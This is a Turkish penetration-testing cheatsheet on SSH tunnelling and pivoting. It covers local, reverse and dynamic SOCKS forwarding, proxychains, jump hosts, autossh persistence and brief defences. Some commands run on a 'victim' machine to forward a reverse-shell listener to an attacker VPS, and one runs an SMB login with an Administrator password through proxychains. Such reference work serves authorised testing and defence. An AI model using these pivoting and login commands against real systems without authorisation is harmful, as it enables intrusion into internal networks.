# 🚇 SSH Tünelleme ve Proxychains - Kapsamlı Başvuru Rehberi (Cheatsheet)

[🇺🇸 English Version](../README.md)

```
  ███████╗███████╗██╗  ██╗    ████████╗██╗   ██╗███╗   ██╗███╗   ██╗███████╗██╗     
  ██╔════╝██╔════╝██║  ██║    ╚══██╔══╝██║   ██║████╗  ██║████╗  ██║██╔════╝██║     
  ███████╗███████╗███████║       ██║   ██║   ██║██╔██╗ ██║██╔██╗ ██║█████╗  ██║     
  ╚════██║╚════██║██╔══██║       ██║   ██║   ██║██║╚██╗██║██║╚██╗██║██╔══╝  ██║     
  ███████║███████║██║  ██║       ██║   ╚██████╔╝██║ ╚████║██║ ╚████║███████╗███████╗
  ╚══════╝╚══════╝╚═╝  ╚═╝       ╚═╝    ╚═════╝ ╚═╝  ╚═══╝╚═╝  ╚═══╝╚══════╝╚══════╝
      Pivotlama, Port Yönlendirme (-L, -R, -D) ve Proxychains Entegrasyonu
```

<p align="center">
  <img src="https://img.shields.io/badge/SSH-Tünelleme_&_Pivotlama-blue?style=for-the-badge" alt="SSH Tunneling">
  <img src="https://img.shields.io/badge/Kategori-Pivotlama_&_Tüneller-green?style=for-the-badge" alt="Pivotlama">
  <img src="https://img.shields.io/badge/Entegrasyon-Proxychains--ng-orange?style=for-the-badge" alt="Proxychains">
  <img src="https://img.shields.io/badge/Protokol-SSH_SOCKS5-purple?style=for-the-badge" alt="SOCKS5">
</p>

<p align="center">
  <b>🚇 Yerel (-L), Uzak/Ters (-R) ve Dinamik SOCKS (-D) SSH tünelleme senaryoları ve Proxychains-ng yapılandırması için eksiksiz başvuru kılavuzu</b>
</p>

---

## 📋 İçindekiler

- [Genel Bakış ve Tünelleme Mimarileri](#-genel-bakış-ve-tünelleme-mimarileri)
- [Yerel Port Yönlendirme (`-L`)](#-yerel-port-yönlendirme--l)
  - [Sözdizimi ve Çalışma Mantığı](#sözdizimi-ve-çalışma-mantığı)
  - [İç Ağdaki Web Arayüzünü Yönlendirme](#iç-ağdaki-web-arayüzünü-yönlendirme)
  - [Uzak Veritabanı Portunu Yönlendirme](#uzak-veritabanı-portunu-yönlendirme)
- [Uzak / Ters Port Yönlendirme (`-R`)](#-uzak--ters-port-yönlendirme--r)
  - [Sözdizimi ve Çalışma Mantığı](#sözdizimi-ve-çalışma-mantığı-1)
  - [Yerel Ters Bağlantı (Reverse Shell) Dinleyicisini Dışa Açma](#yerel-ters-bağlantı-reverse-shell-dinleyicisini-dışa-açma)
  - [DMZ Bölgesinden İç Ağ Trafiği Aktarma](#dmz-bölgesinden-iç-ağ-trafiği-aktarma)
- [Dinamik SOCKS Port Yönlendirme (`-D`)](#-dinamik-socks-port-yönlendirme--d)
  - [Sözdizimi ve SOCKS5 Kurulumu](#sözdizimi-ve-socks5-kurulumu)
- [Proxychains-ng Yapılandırması](#-proxychains-ng-yapılandırması)
  - [`/etc/proxychains4.conf` Dosyasını Düzenleme](#etcproxychains4conf-dosyasını-düzenleme)
  - [Komut Satırı Araçlarını Proxy Üzerinden Çalıştırma](#komut-satırı-araçlarını-proxy-üzerinden-çalıştırma)
- [Çok Atlama Noktalı (Multi-Hop) Pivotlama ve Jump Host (`-J`)](#-çok-atlama-noktalı-multi-hop-pivotlama-ve-jump-host--j)
- [Autossh ile Kalıcı Arka Plan Tünelleri](#-autossh-ile-kalıcı-arka-plan-tünelleri)
- [Etkileşimli SSH Kaçış Dizileri (`~C`)](#-etkileşimli-ssh-kaçış-dizileri-c)
- [Hızlı Referans Tablosu](#-hızlı-referans-tablosu)
- [Savunma Yöntemleri ve OPSEC](#-savunma-yöntemleri-ve-opsec)
- [Yasal Uyarı](#-yasal-uyarı)

---

## 🎯 Genel Bakış ve Tünelleme Mimarileri

SSH yalnızca uzak bir kabuk sunucusu değildir; güvenlik duvarlarını, NAT yapılandırmalarını ve iç ağ izolasyonlarını aşabilen şifreli, çift yönlü bir tünelleme protokolüdür:

1. **Yerel Port Yönlendirme (`-L` - Local):** **Saldırganın kendi yerel makinesinde** bir port açar; gelen istekler SSH tüneli üzerinden uzak SSH sunucusunun erişebildiği hedef adrese yönlendirilir.
2. **Uzak / Ters Port Yönlendirme (`-R` - Remote):** **Uzak SSH sunucusunda** bir port açar; sunucuya gelen istekler SSH tüneli üzerinden saldırganın makinesine veya iç ağdaki bir hedefe akar.
3. **Dinamik Port Yönlendirme (`-D` - Dynamic):** SSH istemcisini yerel bir **SOCKS4/SOCKS5 proxy** sunucusuna dönüştürür. Nmap, Burp Suite, Ffuf veya Metasploit gibi tüm TCP araçları hedef iç ağa bu proxy üzerinden sokulabilir.

```
Saldırgan [Kali]                  SSH Köprü / Pivot                İç Ağ Hedefi
 192.168.1.50   =========>       10.10.10.200 (Çift Ağ Kartı)  --->  172.16.0.15:80
   (Yerel)                       (SSH Sunucusu)                    (İzole Sistem)
```

---

## 🔌 Yerel Port Yönlendirme (`-L`)

### Sözdizimi ve Çalışma Mantığı
```
ssh -L [bağlanacak_adres:]<yerel_port>:<hedef_makine>:<hedef_port> kullanıcı@pivot
```

### İç Ağdaki Web Arayüzünü Yönlendirme
Pivot sunucu (`10.10.10.200`) üzerinden yalnızca iç ağa açık `172.16.0.15:80` web paneline erişmek:
```bash
ssh -N -L 8080:172.16.0.15:80 user@10.10.10.200
```
*Artık yerel tarayıcınızdan `http://127.0.0.1:8080` adresine giderek iç web paneline bağlanabilirsiniz.*

### Uzak Veritabanı Portunu Yönlendirme
Hedef sunucunun yalnızca `127.0.0.1:5432` yereline bağlı PostgreSQL veritabanına erişmek:
```bash
ssh -N -L 5432:127.0.0.1:5432 ubuntu@target-server.com
```

> [!NOTE]
> Kullanılan bayraklar:
> - `-N`: Uzak sunucuda komut kabuğu açma (yalnızca tüneli ayağa kaldır).
> - `-f`: Komutu çalıştırmadan hemen önce tüneli arka plana at.

---

## 🔄 Uzak / Ters Port Yönlendirme (`-R`)

### Sözdizimi ve Çalışma Mantığı
```
ssh -R [bağlanacak_adres:]<uzak_port>:<yerel_makine>:<yerel_port> kullanıcı@saldırgan_vps
```

### Yerel Ters Bağlantı (Reverse Shell) Dinleyicisini Dışa Açma
NAT arkasındaki kurban makineden dışarıya giden bağlantı izni varsa, VPS üzerindeki dinleyiciye tünel açma:
```bash
# Kurban veya pivot makinede çalıştırılır
ssh -N -R 4444:127.0.0.1:4444 attacker@vps.domain.com
```

### DMZ Bölgesinden İç Ağ Trafiği Aktarma
Uzak sunucudaki 8080 portunu yerel 80 portuna yönlendirme:
```bash
ssh -N -R 8080:127.0.0.1:80 user@pivot.corp.local
```

> [!IMPORTANT]
> Uzak portun tüm arayüzlerde (`0.0.0.0`) dinleme yapması isteniyorsa, SSH sunucusunun `/etc/ssh/sshd_config` dosyasında şu ayar bulunmalıdır:
> `GatewayPorts yes` veya `GatewayPorts clientspecified`.

---

## 🌐 Dinamik SOCKS Port Yönlendirme (`-D`)

### Sözdizimi ve SOCKS5 Kurulumu
Yerel makinede `1080` portunda dinamik SOCKS5 proxy oluşturma:
```bash
ssh -N -D 127.0.0.1:1080 user@pivot.corp.local
```

Proxy'nin dinlemede olduğunu doğrulama:
```bash
ss -tlpn | grep 1080
```

---

## ⚙️ Proxychains-ng Yapılandırması

Proxychains, `LD_PRELOAD` kütüphane kancasını kullanarak standart komut satırı araçlarının ağ bağlantılarını tünel üzerinden geçmeye zorlar.

### `/etc/proxychains4.conf` Dosyasını Düzenleme
Ayar dosyasını açıp Dynamic SOCKS tünelini ekleyin:

```ini
# Zincir tipi
strict_chain

# DNS sorgularını da proxy üzerinden yönlendir (DNS sızıntısını önler)
proxy_dns

[ProxyList]
# protokol  ip          port
socks5      127.0.0.1   1080
```

### Komut Satırı Araçlarını Proxy Üzerinden Çalıştırma
```bash
# Nmap TCP Connect Taraması (SOCKS üzerinden SYN taraması çalışmaz!)
proxychains4 nmap -sT -Pn -sV 172.16.0.0/24 -p 22,80,445,3389

# NetExec / CrackMapExec ile iç ağı tarama
proxychains4 nxc smb 172.16.0.100 -u 'Administrator' -p 'P@ssw0rd'

# İç ağ web sunucusuna fuzzing yapma
proxychains4 ffuf -u http://172.16.0.15/FUZZ -w /usr/share/wordlists/dirb/common.txt
```

---

## 🔀 Çok Atlama Noktalı (Multi-Hop) Pivotlama ve Jump Host (`-J`)

Ağ katmanları arasında birden fazla ara sunucu geçmek gerektiğinde:

```bash
# Bastion 1 üzerinden Bastion 2'ye, oradan hedef makineye bağlanma
ssh -J user@bastion1.corp.com:22,user@bastion2.corp.internal target-user@internal-db.corp.internal

# İki sıçrama üzerinden dinamik SOCKS kurma
ssh -J user@bastion1:22,user@bastion2:22 -D 1080 target-user@pivot
```

---

## 🔁 Autossh ile Kalıcı Arka Plan Tünelleri

Ağ kopmaları veya zaman aşımı nedeniyle tünelin düşmesini engellemek için `autossh` otomatik olarak bağlantıyı denetler ve yeniden başlatır:

```bash
# Autossh kurulumu
sudo apt install -y autossh

# Otomatik yeniden bağlanan kalıcı SOCKS tüneli
autossh -M 0 -f -N -D 127.0.0.1:1080 -o "ServerAliveInterval 30" -o "ServerAliveCountMax 3" user@pivot.corp.local
```

---

## ⌨️ Etkileşimli SSH Kaçış Dizileri (`~C`)

Mevcut bir SSH oturumunu kapatmadan çalışma esnasında dinamik olarak port yönlendirme ekleme:

1. `Enter` tuşuna basın.
2. `~C` yazın (Tilde ve ardından büyük C).
3. Komut satırı `ssh> ` şekline dönüşür.
4. Yeni kuralı girin:
   ```text
   ssh> -L 8080:192.168.10.50:80
   Forwarding port.
   ```
   Veya anında SOCKS proxy açın:
   ```text
   ssh> -D 1080
   ```

---

## ⚡ Hızlı Referans Tablosu

| Amaç | Komut |
|------|-------|
| **Yerel Port Yönlendirme** | `ssh -N -L <Y_PORT>:<HEDEF_IP>:<HEDEF_PORT> user@pivot` |
| **Uzak Port Yönlendirme** | `ssh -N -R <U_PORT>:<HEDEF_IP>:<HEDEF_PORT> user@vps` |
| **Dinamik SOCKS5 Proxy**| `ssh -N -D 127.0.0.1:1080 user@pivot` |
| **Arka Planda Sessiz Tünel** | `ssh -f -N -D 1080 user@pivot` |
| **Jump Host Atlama** | `ssh -J user@hop1,user@hop2 target` |
| **Proxychains ile Çalıştırma** | `proxychains4 <ARAÇ> <PARAMETRELER>` |
| **Kalıcı Yeniden Bağlanan Tünel** | `autossh -M 0 -f -N -D 1080 -o "ServerAliveInterval 30" user@pivot` |
| **Canlı Oturumda Tünel Açma** | `Enter` ardından `~C` -> `ssh> -D 1080` |

---

## 🛡️ Savunma Yöntemleri ve OPSEC

1. **SSHD Yapılandırmasını Kısıtlama:** Üretim sunucularında `/etc/ssh/sshd_config` dosyasında `AllowTcpForwarding no` ve `PermitTunnel no` ayarlarını uygulayın.
2. **Ağ Akışı Anomali Tespiti:** Saatlerce açık kalan ve yüksek miktarda çift yönlü veri akışı gerçekleştiren SSH bağlantıları SOC ekipleri tarafından tünelleme aktivitesi olarak izlenmelidir.

---

## ⚠️ Yasal Uyarı

> [!CAUTION]
> SSH tünelleme ve ağ pivotlama teknikleri yalnızca yasal izin alınmış sızma testleri ve yetkili ağ yönetimi senaryolarında kullanılmalıdır. Kurumsal güvenlik sınırlarını izinsiz aşmak suçtur.
